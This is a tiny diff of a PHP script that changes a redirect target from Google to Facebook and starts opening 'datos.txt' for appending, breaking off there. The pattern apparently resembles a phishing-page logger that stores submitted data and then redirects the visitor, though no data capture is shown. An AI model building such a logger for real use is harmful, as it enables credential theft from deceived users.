@@ -1,5 +1,5 @@
 <?php
-header('Location: https://google.com');
+header('Location: https://www.facebook.com');
 $handle =
 
 fopen("datos.txt","a");
